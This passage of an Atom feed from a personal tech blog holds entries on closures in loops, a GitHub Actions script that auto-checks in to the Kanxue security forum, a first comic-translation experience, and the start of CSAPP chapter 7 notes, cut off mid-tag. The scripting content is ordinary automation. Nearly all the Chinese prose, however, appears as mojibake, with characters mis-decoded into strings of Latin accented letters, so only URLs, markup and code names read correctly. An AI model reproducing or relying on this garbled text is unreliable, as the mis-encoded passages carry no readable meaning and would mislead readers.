ä¸ºæ¯ä¸ª<code>f()</code>å‡½æ•°æ†ç»‘å¤–éƒ¨è¯æ³•ç¯å¢ƒä¸­çš„<code>i</code>æ˜¯å¯¹<code>i</code>çš„å¼•ç”¨ï¼Œåœ¨<code>return fs</code>ä¹‹å‰ï¼Œ<code>i</code>å·²ç»å˜æˆ3äº†ï¼Œå› æ­¤æ¯ä¸ª<code>f()</code>å‡½æ•°è¿”å›çš„éƒ½æ˜¯<code>3*3</code>ã€‚</p><p>å› æ­¤ï¼Œè¦å°½é‡é¿å…åœ¨å¾ªç¯ä¸­åˆ›å»ºé—­åŒ…ã€‚å¦‚è‹¥å¿…éœ€ï¼ŒåŠ¡å¿…è¦è°¨æ…ï¼</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;åœ¨å­¦ä¹ JSçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘é‡åˆ°äº†é—­åŒ…è¿™ä¸ªæ¦‚å¿µï¼Œå½“æ—¶å¹¶æ²¡æœ‰åœ¨æ„ã€‚ç›´åˆ°æœ€è¿‘æˆ‘å¼€å§‹è‡ªå­¦pythonï¼Œåœ¨å»–é›ªå³°è€å¸ˆçš„pythonæ•™ç¨‹ä¸­åˆä¸€æ¬¡çœ‹åˆ°äº†è¿™ä¸ªåè¯ï¼Œæˆ‘æ‰æ„è¯†åˆ°é—­åŒ…å…¶å®æ˜¯ä¸€ä¸ªé‡è¦çš„æ¦‚å¿µï¼Œæˆ–è€…è¯´ç‰¹æ€§ï¼Œè®¸å¤šé«˜çº§è¯­è¨€æ”¯æŒé—­åŒ…ï¼ˆæ¯”å¦‚è¿‘äº›å¹´æ¯”è¾ƒç«çš„Goè¯­è¨€ï¼‰ã€‚äºæ˜¯æˆ‘æŸ¥çœ‹äº†ç›¸å…³æ–‡æ¡£ã€æ•™ç¨‹ï¼Œæ‰“ç®—è°ˆè°ˆæˆ‘å¯¹é—­åŒ…çš„ä¸€äº›è®¤è¯†ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="å‰ç«¯" scheme="https://blog.beacox.space/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="javascript" scheme="https://blog.beacox.space/tags/javascript/"/>
    
    <category term="python" scheme="https://blog.beacox.space/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>åŸºäºGitHub Actionsçš„çœ‹é›ªè®ºå›è‡ªåŠ¨ç­¾åˆ°ï¼Œå¯é€‰æ¨é€ä¸å¦</title>
    <link href="https://blog.beacox.space/posts/pediy-CheckIn/"/>
    <id>https://blog.beacox.space/posts/pediy-CheckIn/</id>
    <published>2022-09-19T23:00:36.000Z</published>
    <updated>2022-09-19T23:00:36.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://bbs.pediy.com/">çœ‹é›ªè®ºå›</a>ç§°å¾—ä¸Šæ˜¯å›½å†…è¾ƒå¥½çš„å®‰å…¨è®ºå›äº†ã€‚ä¸è¿‡è¦1ké›ªå¸ï¼ˆè®ºå›è™šæ‹Ÿå¸ï¼Œæ–°ç”¨æˆ·å‡ ä¹éƒ½å¯ä»¥è·å¾—220åŠä»¥ä¸Šï¼‰æ‰å¯ä»¥å‡çº§ä¸ºæ­£å¼ä¼šå‘˜ã€‚ä¸´æ—¶ä¼šå‘˜æœ‰è¯¸å¤šé™åˆ¶ï¼ŒåŒ…æ‹¬ä¸èƒ½æŸ¥çœ‹ã€WEBå®‰å…¨ã€ç‰ˆå—ç­‰ã€‚å¯¹äºæˆ‘è¿™ç§æƒ³ç™½å«–çš„å®‰å…¨å°ç™½æ¥è¯´ï¼Œå”¯ä¸€çš„æ–¹æ³•å°±æ˜¯æ¯å¤©ç­¾åˆ°éšæœºè·å¾—1-10æšé›ªå¸ã€‚ä½†æ˜¯æˆ‘ç»å¸¸ä¼šå¿˜è®°ç­¾åˆ°ï¼Œè¿™ç­‰åˆ°çŒ´å¹´é©¬æœˆï¼Ÿ<br>æ­£å¥½æˆ‘æœ€è¿‘æ­£åœ¨å­¦ä¹ JSï¼Œäºæ˜¯å†™äº†ä¸€ä¸ªè‡ªåŠ¨ç­¾åˆ°çš„è„šæœ¬ã€‚å½“ç„¶ï¼Œé™¤äº†å‡çº§æ­£å¼ä¼šå‘˜ï¼Œé›ªå¸è¿˜æœ‰è®¸å¤šç”¨å¤„ï¼Œæ‰€ä»¥å¯¹å·²ç»æ˜¯æ­£å¼ä¼šå‘˜çš„ç”¨æˆ·æ¥è¯´ä¹Ÿè¿˜ç®—æœ‰äº›ç”¨ç½¢ã€‚</p><p>å…ˆä¸Šä¼ é€é—¨ï¼š</p><div class="tag link"><a class="link-card" title="pediy-CheckIn" href="https://github.com/BeaCox/pediy-CheckIn"><div class="left"><img src="https://github.githubassets.com/favicons/favicon.svg" class="lazyload" data-srcset="https://github.githubassets.com/favicons/favicon.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></div><div class="right"><p class="text">pediy-CheckIn</p><p class="url">https://github.com/BeaCox/pediy-CheckIn</p></div></a></div><h2 id="å®ç°æ–¹æ³•"><a href="#å®ç°æ–¹æ³•" class="headerlink" title="å®ç°æ–¹æ³•"></a>å®ç°æ–¹æ³•</h2><p>è¿™ä¸ªè„šæœ¬çš„å®ç°éå¸¸ç®€å•ã€‚</p><ol><li>é€šè¿‡æŠ“åŒ…å¯ä»¥å‘ç°ï¼Œçœ‹é›ªè®ºå›çš„ç­¾åˆ°æ˜¯é€šè¿‡å‘<code>https://bbs.pediy.com/user-signin.htm</code>é¡µé¢å‘é€å«Cookieçš„POSTè¯·æ±‚æ¥å®ç°çš„ï¼ˆä¹Ÿæ˜¯ç»å¤§å¤šæ•°ç­¾åˆ°ä¸šåŠ¡çš„è®¾è®¡é€»è¾‘ï¼‰ï¼Œå› æ­¤åˆ©ç”¨<a href="https://www.axios-http.cn/">Axios</a>åº“çš„APIæ¥å‘è¯¥é¡µé¢å‘é€è¯·æ±‚ï¼Œæ¨¡æ‹Ÿç”¨æˆ·ç­¾åˆ°ã€‚</li><li>ç­¾åˆ°å®Œæˆåï¼Œå°†å“åº”çš„æ•°æ®èµ‹å€¼ç»™ä¸€ä¸ªå¯¹è±¡ï¼Œé€šè¿‡<code>response.data.code</code>å’Œ<code>response.data.message</code>æ¥åˆ¤æ–­ç½‘ç»œæ­£å¸¸æƒ…å†µä¸‹ï¼Œç­¾åˆ°ä»»åŠ¡çš„ä¸‰ç§å¯èƒ½æƒ…å†µã€‚<ul><li><code>code == 0 &amp;&amp; message = &lt;ç­¾åˆ°è·å¾—é›ªå¸æ•°&gt; </code>: è¡¨ç¤ºç­¾åˆ°æˆåŠŸã€‚æ¨é€æ¶ˆæ¯æ˜¾ç¤º`ç­¾åˆ°æˆåŠŸï¼Œè·å¾—${msg}é›ªå¸`ã€‚</li><li><code>code == -1 &amp;&amp; message == 'æ‚¨ä»Šæ—¥å·²ç­¾åˆ°æˆåŠŸ'</code> : è¡¨ç¤ºå·²ç»ç­¾åˆ°è¿‡ï¼Œæ­¤å¤„ä¸ºé‡å¤ç­¾åˆ°ã€‚æ¨é€æ¶ˆæ¯æ˜¾ç¤ºâ€™æ‚¨ä»Šæ—¥å·²ç­¾åˆ°æˆåŠŸâ€™ã€‚</li><li><code>code == -1 &amp;&amp; message == 'è¯·å…ˆç™»å½•'</code>: è¡¨ç¤ºCookieéªŒè¯å¤±è´¥ã€‚æ‰“å°é”™è¯¯å¹¶ä¸æ¨é€æ¶ˆæ¯</li></ul></li><li>æ¨é€æ¶ˆæ¯çš„åŠŸèƒ½åˆ©ç”¨<a href="https://www.pushplus.plus/">pushplus</a>æä¾›çš„æ¥å£å®ç°ï¼Œå› ä¸ºæ¯”<a href="https://sct.ftqq.com/">Serveré…±</a>å…è´¹ç‰ˆé™åˆ¶å°‘ä¸€äº›ï¼Œå½“ç„¶åç»­å¯èƒ½ä¼šæ·»åŠ serveré…±ç­‰å…¶ä»–é€‰é¡¹ã€‚åŒæ ·æ˜¯åˆ©ç”¨äº†Axiosçš„åº“æ¥å‘æ¥å£å‘é€è¯·æ±‚ã€‚å¯ä»¥å‚è€ƒ<a href="https://www.pushplus.plus/doc/">pushplusæ–‡æ¡£ä¸­å¿ƒ</a></li><li>åˆ©ç”¨GitHub Actionsï¼Œåœ¨GitHubæä¾›çš„ä¸»æœºä¸Šç”¨nodeè¿è¡Œjsï¼Œé€šè¿‡<code>crontab</code>å®Œæˆå®šæ—¶ä»»åŠ¡ã€‚</li><li>GitHub Actionsåœ¨ä»“åº“60å¤©ä»¥ä¸Šæ²¡æœ‰ä»»ä½•æ´»åŠ¨æ—¶ä¼šè¢«suspendedï¼ˆæ¨è¿Ÿï¼‰ï¼Œå› æ­¤åˆ©ç”¨<a href="https://github.com/gautamkrishnar/keepalive-workflow">Keepalive Workflow</a>æ¥ä½¿å·¥ä½œæµæŒ‰æœŸè¿è¡Œã€‚</li></ol><h2 id="åç»­"><a href="#åç»­" class="headerlink" title="åç»­"></a>åç»­</h2><p>å¸Œæœ›å„ä½èƒ½å¸®æˆ‘ç‚¹ä¸€ä¸ªstarâœ¨ï¼ˆç†ç›´æ°”å£®ï¼‰<br>ç”±äºè¿™æ˜¯æˆ‘ç¬¬ä¸€ä¸ªjsè„šæœ¬ï¼Œç¨‹åºå¥å£®æ€§æƒ³å¿…ä¸ç”šå¥½ï¼Œæ¬¢è¿å¤§å®¶æå‡ºissueå’Œprï¼</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://bbs.pediy.com/&quot;&gt;çœ‹é›ªè®ºå›&lt;/a&gt;ç§°å¾—ä¸Šæ˜¯å›½å†…è¾ƒå¥½çš„å®‰å…¨è®ºå›äº†ã€‚ä¸è¿‡è¦1ké›ªå¸ï¼ˆè®ºå›è™šæ‹Ÿå¸ï¼Œæ–°ç”¨æˆ·å‡ ä¹éƒ½å¯ä»¥è·å¾—220åŠä»¥ä¸Šï¼‰æ‰å¯ä»¥å‡çº§ä¸ºæ­£å¼ä¼šå‘˜ã€‚ä¸´æ—¶ä¼šå‘˜æœ‰è¯¸å¤šé™åˆ¶ï¼ŒåŒ…æ‹¬ä¸èƒ½æŸ¥çœ‹ã€WEBå®‰å…¨ã€ç‰ˆå—ç­‰ã€‚å¯¹äºæˆ‘è¿™ç§æƒ³ç™½å«–çš„å®‰å…¨å°</summary>
      
    
    
    
    <category term="é¡¹ç›®" scheme="https://blog.beacox.space/categories/%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="Actions" scheme="https://blog.beacox.space/tags/Actions/"/>
    
    <category term="javascript" scheme="https://blog.beacox.space/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>è®°å½•ç¬¬ä¸€æ¬¡å‚ä¸ç¾æ¼«ç¿»è¯‘</title>
    <link href="https://blog.beacox.space/posts/sp-translate/"/>
    <id>https://blog.beacox.space/posts/sp-translate/</id>
    <published>2022-07-06T12:02:22.000Z</published>
    <updated>2022-07-06T12:02:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>æœ‰ç‚¹å°å…´å¥‹ã€‚æˆ‘ç»ˆäºä¹Ÿæˆäº†ä¸€åâ€çƒ¤è‚‰manâ€ã€‚ä»¥å‰çœ‹ç¾å‰§ã€ç¾æ¼«çš„æ—¶å€™ç‰‡å¤´å­—å¹•ç»„ç»™æˆ‘çš„æ„Ÿè§‰å°±æ˜¯ï¼šå¸…çˆ†äº†ã€‚è¯•æƒ³ä¸€ä¸‹ï¼Œä½ å°†è‡ªå·±å–œæ¬¢çœ‹çš„å‰§ç¿»è¯‘æˆä¸­æ–‡ï¼Œä½ çš„åŒå¥½çœ‹çš„æŸä¸€é›†å°±æ˜¯ä½ ç¿»è¯‘çš„â€”â€”SO DAMN COOL!<span id="more"></span></p><h2 id="å…³äºæˆ‘çœ‹ç¾æ¼«è¿™ä»¶äº‹"><a href="#å…³äºæˆ‘çœ‹ç¾æ¼«è¿™ä»¶äº‹" class="headerlink" title="å…³äºæˆ‘çœ‹ç¾æ¼«è¿™ä»¶äº‹"></a>å…³äºæˆ‘çœ‹ç¾æ¼«è¿™ä»¶äº‹</h2><p>è™½ç„¶æˆ‘çš„å¤´åƒæ˜¯ç‚­æ²»éƒï¼Œä½†å…¶å®æˆ‘å¹³æ—¶çœ‹æ—¥æ¼«çœŸä¸å¤šï¼Œæˆ‘è¿‘å‡ å¹´çœ‹è¿‡çš„æ—¥æ¼«ç®€ç›´å±ˆæŒ‡å¯æ•°ï¼šã€Šé¬¼ç­ä¹‹åˆƒã€‹ã€ã€Šå’’æœ¯å›æˆ˜ã€‹ï¼Œã€Šå›½ç‹æ’åã€‹ç”šè‡³åªçœ‹äº†ä¸€ç‚¹ç‚¹ã€‚å€’æ˜¯çœ‹ç¾æ¼«çœ‹å¾—è¿˜æ¯”è¾ƒå¤š<del>ï¼Œåªä¸è¿‡æ²¡å¤šå°‘èƒ½æ‹¿æ¥å½“å¤´åƒçš„</del>ã€‚èƒ½æ‹¿åˆ°å°é¢ä¸Šæ¥è¯´çš„æœ‰ï¼š<em>Rick and Morty</em>, <em>Gravity Falls</em>, <em>Love,Death&amp;Robots</em>ã€‚å‰©ä¸‹çš„å°±ä¸å¤šè¯´äº†<del>ï¼Œå¦‚æœæœ‰ç¾æ¼«åŒå¥½ä¹Ÿå¯ä»¥ç§æˆ‘</del>ã€‚åæ­£å¯¹æˆ‘æ¥è¯´ï¼Œçœ‹æ—¥æ¼«æ˜¯å› ä¸ºçƒ­è¡€ï¼Œçœ‹ç¾æ¼«æ˜¯å› ä¸ºè„‘æ´ã€‚å¯èƒ½å–œæ¬¢çœ‹ç¾æ¼«æ˜¯å› ä¸ºå®ƒèƒ½è®©æˆ‘ä»å›ºåŒ–çš„æ€ç»´å½“ä¸­æš‚æ—¶æŠ½ç¦»å‡ºæ¥å§ï¼</p><h2 id="çƒ¤è‚‰çš„èµ·å› "><a href="#çƒ¤è‚‰çš„èµ·å› " class="headerlink" title="çƒ¤è‚‰çš„èµ·å› "></a>çƒ¤è‚‰çš„èµ·å› </h2><p>å‘çœ‹å›½å¤–ç‰‡å­å°‘çš„å°ä¼™ä¼´ä»¬è§£é‡Šä¸‹ï¼Œä¸€èˆ¬ç§°æ²¡æœ‰ç¿»è¯‘çš„å¤–è¯­ç‰‡ä¸ºç”Ÿè‚‰ï¼Œæœ‰ä¸­æ–‡å­—å¹•çš„åˆ™å«åšç†Ÿè‚‰ï¼Œè€Œç¿»è¯‘è¿‡ç¨‹å°±å«åšçƒ¤è‚‰ã€‚è¿™ä»¶äº‹çš„èµ·å› æ˜¯æˆ‘çš„ä¸€ä¸ªå¥½å…„å¼Ÿæ‰¾åˆ°äº†è¿™éƒ¨åŠ¨æ¼«ä¸­æ–‡å­—å¹•ç»„çš„è´¦å·ï¼Œçœ‹åˆ°äº†ä»–ä»¬å‘å¸ƒçš„æ‹›æ–°ä¿¡æ¯ï¼Œä»–å°±åŠ å…¥äº†ã€‚åæ¥ä»–å‘Šè¯‰æˆ‘ç¿»è¯‘å·¥ä½œé¢‘ç‡å¾ˆä½ã€éšç¼˜ï¼Œè€Œä¸”ç¿»è¯‘æµ‹è¯•å¾ˆç®€å•ï¼Œæˆ‘å°±è·Ÿç€å†²äº†ã€‚ï¼ˆæœç„¶easyï¼Œæ¯•ç«Ÿæ‹›æ–°è¦æ±‚æ˜¯åˆä¸‰ä»¥ä¸Šå³å¯ XDï¼‰</p><h2 id="çƒ¤è‚‰çš„ç»è¿‡"><a href="#çƒ¤è‚‰çš„ç»è¿‡" class="headerlink" title="çƒ¤è‚‰çš„ç»è¿‡"></a>çƒ¤è‚‰çš„ç»è¿‡</h2><p>ä¸¥æ ¼æ¥è¯´ï¼Œæˆ‘åšçš„å¹¶ä¸èƒ½ç®—çƒ¤è‚‰çš„å·¥ä½œã€‚è¿™éƒ¨åŠ¨æ¼«è”æ‰‹è‚²ç¢§ç­‰å…¬å¸å‘å¸ƒäº†ä¸‰æ¬¾æ¸¸æˆï¼šçœŸç†ä¹‹æ–ã€å®Œæ•´ç ´ç¢ã€æ‰‹æœºæ¯ç­è€…ï¼ˆçœ‹è¿‡åŠ¨æ¼«æˆ–è€…ç©è¿‡æ¸¸æˆçš„å°ä¼™ä¼´æƒ³å¿…å·²ç»çŸ¥é“æˆ‘è¯´çš„æ˜¯å“ªéƒ¨åŠ¨æ¼«äº†ï¼Œæˆ‘ç¿»è¯‘çš„æ˜¯æ¸¸æˆæ¼”ç¤ºè§†é¢‘ï¼Œä½†æˆ‘å·²ç»å¾ˆæ»¡æ„äº†ã€‚</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://bu.dusays.com/2023/06/18/648e777d23930.png" data-fancybox="default" data-caption="èŠå¤©è®°å½•"><img fancybox="" itemprop="contentUrl" src="https://bu.dusays.com/2023/06/18/648e777d23930.png" class="lazyload" data-srcset="https://bu.dusays.com/2023/06/18/648e777d23930.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="èŠå¤©è®°å½•"></a><span class="image-caption">èŠå¤©è®°å½•</span></div></div><p>å¾ˆå¤šåŠ ç¾¤çš„æ–°äººéƒ½ä¼šé—®è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼šâ€œæœ‰ddlå—ï¼Ÿâ€ä»–ä»¬éƒ½ä¼šå¾—åˆ°ç›¸åŒçš„æœ‰äº›æ„å¤–çš„ç­”æ¡ˆï¼šâ€œæ²¡æœ‰â€ã€‚å› ä¸ºæ‰€æœ‰ç¿»è¯‘å…¨éƒ½æ˜¯ç”¨çˆ±å‘ç”µã€ä¸ºçˆ±å‘ç”µã€‚æ²¡æœ‰äººä¼šè¦æ±‚ä½ å®Œæˆå¤šå°‘ç¿»è¯‘ä»»åŠ¡ï¼Œæ²¡æœ‰äººé™å®šç¿»è¯‘æ—¶é—´ï¼›åŒæ ·åœ°ï¼Œæ²¡æœ‰äººä¼šè¿›ç¾¤åˆ’æ°´ï¼Œä¹Ÿæ²¡æœ‰äººé¢†äº†ä»»åŠ¡è¿Ÿè¿Ÿä¸å®Œæˆã€‚å¦å¤–ï¼Œåœ¨çƒ¤è‚‰çš„è¿‡ç¨‹ä¸­ï¼Œè™½ç„¶æœ‰wikiå¯ä»¥å‚è€ƒï¼Œä½†æ˜¯åƒè¿™æ ·ä¸€éƒ¨æ¢—æ»¡å¤©é£çš„ç¾æ¼«ä»æ—§æ˜¯å¾ˆéš¾ç¿»è¯‘çš„ã€‚æœ‰äº›æ¢—å¯èƒ½ååˆ†å†·é—¨ï¼Œå› æ­¤ç¿»è¯‘éš¾åº¦å¾ˆå¤§ï¼Œä½†æ˜¯æ²¡æœ‰è°ä¼šæ‘†çƒ‚çç¿»ã€‚ä¹‹å‰ç¾¤é‡Œæœ‰ä¸€æ®µå…³äºæŸä¸€ç¼©å†™çš„å«ä¹‰çš„è®¨è®ºï¼ŒæŒç»­äº†å¥½å‡ å¤©æ‰å¾—å‡ºç»“è®ºã€‚</p><h2 id="ä¸€äº›æ„Ÿå—"><a href="#ä¸€äº›æ„Ÿå—" class="headerlink" title="ä¸€äº›æ„Ÿå—"></a>ä¸€äº›æ„Ÿå—</h2><p>åŠ å…¥ç¿»è¯‘ç»„ä¸ä»…è®©æˆ‘ç»“è¯†äº†ä¸€ç¾¤è¯¥åŠ¨æ¼«çš„åŒå¥½ï¼Œä¹Ÿè®©æˆ‘çš„ç¿»è¯‘èƒ½åŠ›æœ‰äº†å¤§å¹…åº¦çš„æå‡ã€‚æ¯•ç«Ÿåœ¨å¤§å­¦é‡Œæˆ‘çš„è‹±è¯­å…¨é é«˜ä¸­çš„åŠŸåº•å¼ºæ’‘ç€ï¼Œæˆ‘æ˜¯ä¸å¤ªå¯èƒ½ä¸»åŠ¨å­¦ä¹ è‹±è¯­çš„ã€‚ä½†æ˜¯æˆ‘çš„ç¡®å–œæ¬¢ç¿»è¯‘ï¼Œè¿™æ˜¯ä¸€ç§å°†åœ°é“çš„å¤–å›½è¡¨è¾¾è½¬æ¢æˆå¤Ÿå‘³å„¿çš„ä¸­æ–‡è¡¨è¾¾çš„è¿‡ç¨‹ï¼Œæ˜¯å¤šå…ƒæ–‡åŒ–çš„ç¢°æ’ã€‚å½“ç„¶ï¼Œæ¯‹å®è¯´æ˜¯è¿™è®©æˆ‘ç†è§£æ›´å¤šæ¢—ã€è®©æˆ‘æœ‰ä¸€ç§å¹³æ—¥é‡Œå°‘æœ‰çš„è‡ªè±ªæ„Ÿã€‚</p><p>å…¶å®è¿™æ ·çš„ç¿»è¯‘å·¥ä½œè·Ÿåšå®¢åˆ›ä½œå€’æ˜¯æœ‰äº›ç›¸ä¼¼ä¹‹å¤„ï¼šä¸€ç¾¤åŒå¥½èšé›†åœ¨ä¸€èµ·åšå–œæ¬¢çš„äº‹ï¼Œå……æ»¡çƒ­æƒ…å’Œæ´»åŠ›ï¼Œä¸€èµ·è®¨è®ºé—®é¢˜ã€è§£å†³é—®é¢˜ã€åˆ†äº«ã€‚å½“ç„¶ï¼Œè¿˜æœ‰ä¸ºçˆ±å‘ç”µã€‚æˆ‘è®¤è¯†çš„ç»å¤§å¤šæ•°åšä¸»åˆ›ä½œåšå®¢çš„ç›®çš„éƒ½ä¸æ˜¯ä¸ºäº†ç›ˆåˆ©ï¼Œæ¯•ç«Ÿåšåšå®¢çš„ç›ˆåˆ©æˆ–è®¸éƒ½å¾ˆéš¾æ¯”å¾—ä¸Šç»´æŠ¤åšå®¢æ‰€è€—è´¹çš„æ—¶é—´ã€ç²¾åŠ›ã€è´¢åŠ›ã€‚å¯¹äº†ï¼Œå¯¹æˆ‘æ¥è¯´è¿™ä¸¤ä¸ªåœˆå­è¿˜æœ‰ä¸€ä¸ªå…±åŒç‚¹ï¼šé‚£å°±æ˜¯æ¯”æˆ‘ç°åœ¨å¤§å­¦ç”Ÿæ´»çš„åœˆå­ç²¾å½©å¾—å¤šã€‚</p><p>æœ€åæ”¾ä¸€å¼ æˆ‘ç¿»è¯‘çš„ç‰‡æ®µå§ï¼</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://bu.dusays.com/2023/06/18/648e7790ddd7a.png" data-fancybox="default" data-caption="image-20220706210344922"><img fancybox="" itemprop="contentUrl" src="https://bu.dusays.com/2023/06/18/648e7790ddd7a.png" class="lazyload" data-srcset="https://bu.dusays.com/2023/06/18/648e7790ddd7a.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220706210344922"></a><span class="image-caption">image-20220706210344922</span></div></div><p>è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡çƒ¤è‚‰ï¼Œå› æ­¤å¾ˆå¤šè¡¨è¾¾ç¿»è¯‘æˆä¸­æ–‡è‡ªå·±éƒ½æ„Ÿè§‰æ€ªæ€ªçš„ï¼Œå¸Œæœ›èƒ½ç»§ç»­è¿›æ­¥å§ï¼<del>è¿˜æƒ³å‚ä¸ä¸‹åŠå¹´ç”µå½±å­—å¹•çš„ç¿»è¯‘å‘¢å˜¿å˜¿</del></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æœ‰ç‚¹å°å…´å¥‹ã€‚æˆ‘ç»ˆäºä¹Ÿæˆäº†ä¸€åâ€çƒ¤è‚‰manâ€ã€‚ä»¥å‰çœ‹ç¾å‰§ã€ç¾æ¼«çš„æ—¶å€™ç‰‡å¤´å­—å¹•ç»„ç»™æˆ‘çš„æ„Ÿè§‰å°±æ˜¯ï¼šå¸…çˆ†äº†ã€‚è¯•æƒ³ä¸€ä¸‹ï¼Œä½ å°†è‡ªå·±å–œæ¬¢çœ‹çš„å‰§ç¿»è¯‘æˆä¸­æ–‡ï¼Œä½ çš„åŒå¥½çœ‹çš„æŸä¸€é›†å°±æ˜¯ä½ ç¿»è¯‘çš„â€”â€”SO DAMN COOL!&lt;/p&gt;</summary>
    
    
    
    <category term="ç”Ÿæ´»" scheme="https://blog.beacox.space/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="æ‚ä¸ƒæ‚å…«" scheme="https://blog.beacox.space/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
  </entry>
  
  <entry>
    <title>ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿã€‹ç¬¬7ç« ï¼šé“¾æ¥ é˜…è¯»æŠ¥å‘Š</title>
    <link href="https://blog.beacox.space/posts/csapp-7/"/>
    <id>https://blog.beacox.space/posts/csapp-7/</id>
    <published>2022-07-01T07:50:32.000Z</published>
    <updated>2022-07-01T07:50:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ç¯‡æ–‡ç« æ˜¯é˜…è¯»ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿã€‹ç¬¬7ç« ï¼šé“¾æ¥åå†™ä¸‹çš„ï¼Œå¾ˆå¤šåœ°æ–¹å†™å¾—å¹¶ä¸è¯¦ç»†ï¼Œä¹Ÿæ— æ³•ä¿è¯å®Œå…¨æ­£ç¡®ã€‚ä¸»è¦æ˜¯ä¸ºäº†è®°å½•æˆ‘å­¦ä¹ é“¾æ¥ç›¸å…³çŸ¥è¯†çš„è¿‡ç¨‹ï¼Œä»…ä¾›å‚è€ƒã€‚<span id="more"></span></p><h2 id="ä»€ä¹ˆæ˜¯é“¾æ¥ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯é“¾æ¥ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯é“¾æ¥ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯é“¾æ¥ï¼Ÿ</h2><blockquote><p> é“¾æ¥æ˜¯å°†å„ç§ä»£ç å’Œæ•°æ®ç‰‡æ®µæ”¶é›†å¹¶ç»„åˆæˆä¸ºä¸€ä¸ªå•ä¸€æ–‡ä»¶çš„è¿‡ç¨‹ï¼Œè¿™ä¸ªæ–‡ä»¶å¯è¢«åŠ è½½ï¼ˆå¤åˆ¶ï¼‰åˆ°å†…å­˜å¹¶æ‰§è¡Œã€‚</p></blockquote><p>é“¾æ¥å¯ä»¥æ‰§è¡Œäºç¼–è¯‘æ—¶ã€åŠ è½½æ—¶ã€è¿è¡Œæ—¶ã€‚</p><h2 id="ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åº"><a href="#ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åº" class="headerlink" title="ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åº"></a>ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åº</h2><blockquote><p>å¤§å¤šæ•°ç¼–è¯‘ç³»ç»Ÿæä¾›<em>ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åº</em>(compile driver)ï¼Œå®ƒä»£è¡¨ç”¨æˆ·åœ¨éœ€è¦æ—¶è°ƒç”¨è¯­è¨€é¢„å¤„ç†å™¨ã€ç¼–è¯‘å™¨ã€æ±‡ç¼–å™¨å’Œé“¾æ¥å™¨ã€‚</p></blockquote><p>ç”¨GNUç¼–è¯‘ç³»ç»Ÿæ„é€ ç¨‹åºæ—¶ï¼Œæˆ‘ä»¬è°ƒç”¨<em>GCC</em>(GNU Compiler Collection)é©±åŠ¨ç¨‹åºã€‚</p><p>GCCæœ‰å‡ ä¸ªå¸¸ç”¨çš„å‚æ•°ï¼š</p><table><thead><tr><th>å‚æ•°</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>-c</td><td>å°†æºæ–‡ä»¶ç¼–è¯‘æˆç›®æ ‡æ–‡ä»¶ä½†ä¸é“¾æ¥</td></tr><tr><td>-d</td><td>åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æ‰“å°å‡ºæ‰€æœ‰çš„è°ƒè¯•ä¿¡æ¯</td></tr><tr><td>-S</td><td>å°†æºæ–‡ä»¶ç¼–è¯‘æˆæ±‡ç¼–ä»£ç ï¼Œä¸è¿›è¡Œæ±‡ç¼–å’Œé“¾æ¥</td></tr><tr><td>-E</td><td>åªå¯¹æºæ–‡ä»¶è¿›è¡Œé¢„å¤„ç†ï¼Œä¸è¿›è¡Œç¼–è¯‘ã€æ±‡ç¼–ã€é“¾æ¥</td></tr><tr><td>-o <file></file></td><td>æŒ‡æ˜è¾“å‡ºæ–‡ä»¶åä¸ºfile</td></tr><tr><td>-g</td><td>æ‰“å¼€è°ƒè¯•å¼€å…³ï¼Œè®©ç¼–è¯‘çš„ç›®æ ‡æ–‡ä»¶æœ‰è°ƒè¯•ä¿¡æ¯</td></tr><tr><td>-O0, -O1, -O2,  -O3</td><td>æ§åˆ¶ä»£ç ä¼˜åŒ–å¼ºåº¦ï¼Œ-O3æœ€å¼º</td></tr></tbody></table><h3 id="ä¸¾ä¸ªä¾‹å­"><a href="#ä¸¾ä¸ªä¾‹å­" class="headerlink" title="ä¸¾ä¸ªä¾‹å­"></a>ä¸¾ä¸ªä¾‹å­</h3><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t1/76109/2/16891/41270/634eb075E6fd16631/69483619f038e331.png" data-fancybox="default" data-caption="undefined"><img fancybox="" itemprop="contentUrl" 